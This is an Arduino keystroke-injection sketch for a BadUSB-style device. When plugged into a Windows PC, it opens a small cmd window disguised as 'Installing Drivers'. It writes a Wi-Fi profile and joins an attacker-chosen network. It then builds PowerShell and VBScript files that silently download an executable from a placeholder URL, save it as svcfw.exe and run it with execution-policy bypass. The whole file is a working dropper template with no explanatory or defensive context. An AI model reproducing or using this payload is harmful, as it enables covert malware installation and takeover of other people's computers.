void setup(){
  Keyboard.begin();
}
void loop(){
  
  delay(3000);
  wait_for_drivers(2000);

  minimise_windows();
  delay(500);
  while(!cmd(3,500,"cmd /T:01 /K \"@echo off && mode con:COLS=15 LINES=1 && title Installing Drivers\""))
  {
  reset_windows_desktop(2000);
  }

  Keyboard.println(F("echo ^<?xml version=\"1.0\"?^> > %TEMP%\\pl.xml "));
  Keyboard.println(F("echo ^<WLANProfile xmlns=\"http://www.microsoft.com/networking/WLAN/profile/v1\"^> >> %TEMP%\\pl.xml "));
  Keyboard.println(F("echo ^<name^>INPUT0^</name^> >> %TEMP%\\pl.xml "));
  Keyboard.println(F("echo ^<SSIDConfig^> >> %TEMP%\\pl.xml "));
  Keyboard.println(F("echo ^<SSID^> >> %TEMP%\\pl.xml "));
  Keyboard.println(F("echo ^<hex^>INPUT1^</hex^> >> %TEMP%\\pl.xml "));
  Keyboard.println(F("echo ^<name^>INPUT0^</name^> >> %TEMP%\\pl.xml "));
  Keyboard.println(F("echo ^</SSID^> >> %TEMP%\\pl.xml "));
  Keyboard.println(F("echo ^</SSIDConfig^> >> %TEMP%\\pl.xml "));
  Keyboard.println(F("echo ^<connectionType^>ESS^</connectionType^> >> %TEMP%\\pl.xml "));
  Keyboard.println(F("echo ^<connectionMode^>auto^</connectionMode^> >> %TEMP%\\pl.xml "));
  Keyboard.println(F("echo ^<MSM^> >> %TEMP%\\pl.xml "));
  Keyboard.println(F("echo ^<security^> >> %TEMP%\\pl.xml "));
  Keyboard.println(F("echo ^<authEncryption^> >> %TEMP%\\pl.xml "));
  Keyboard.println(F("echo ^<authentication^>WPA2PSK^</authentication^> >> %TEMP%\\pl.xml "));
  Keyboard.println(F("echo ^<encryption^>AES^</encryption^> >> %TEMP%\\pl.xml "));
  Keyboard.println(F("echo ^<useOneX^>false^</useOneX^> >> %TEMP%\\pl.xml "));
  Keyboard.println(F("echo ^</authEncryption^> >> %TEMP%\\pl.xml "));
  Keyboard.println(F("echo ^<sharedKey^> >> %TEMP%\\pl.xml "));
  Keyboard.println(F("echo ^<keyType^>passPhrase^</keyType^> >> %TEMP%\\pl.xml "));
  Keyboard.println(F("echo ^<protected^>false^</protected^> >> %TEMP%\\pl.xml "));
  Keyboard.println(F("echo ^<keyMaterial^>INPUT2^</keyMaterial^> >> %TEMP%\\pl.xml "));
  Keyboard.println(F("echo ^</sharedKey^> >> %TEMP%\\pl.xml "));
  Keyboard.println(F("echo ^</security^> >> %TEMP%\\pl.xml "));
  Keyboard.println(F("echo ^</MSM^> >> %TEMP%\\pl.xml "));
  Keyboard.println(F("echo ^</WLANProfile^> >> %TEMP%\\pl.xml "));
  Keyboard.println(F("netsh wlan add profile filename=%TEMP%\\pl.xml "));
  delay(2000);
  Keyboard.println(F("netsh wlan connect name=INPUT0 "));
  delay(3000);
  Keyboard.println(F("echo $wc = New-Object System.Net.WebClient > %temp%\\dl.ps1"));
  Keyboard.println(F("echo $url = \"INPUT3\" >> %temp%\\dl.ps1"));
  Keyboard.println(F("echo [string]$hex = $wc.DownloadString($url) >> %temp%\\dl.ps1"));
  Keyboard.println(F("echo [Byte[]] $temp = $hex -split ' ' >> %temp%\\dl.ps1"));
  Keyboard.println(F("echo [System.IO.File]::WriteAllBytes(\"%TEMP%\\svcfw.exe\", $temp) >> %temp%\\dl.ps1"));
  Keyboard.println(F("echo start-process -nonewwindow \"%TEMP%\\svcfw.exe\" >> %temp%\\dl.ps1"));
   
  delay(2000);
  
  Keyboard.println(F("echo Set oShell = CreateObject(\"WScript.Shell\") > %temp%\\dl.vbs"));
  Keyboard.println(F("echo oShell.Run(\"powershell.exe -ep bypass -nologo -c %temp%\\dl.ps1\"),0,true >> %temp%\\dl.vbs"));
  delay(1000);
  Keyboard.println(F("wscript %temp%\\dl.vbs"));
  delay(3000);
  
  Keyboard.println(F("exit"));
  while(true){};
  

}

DEFS




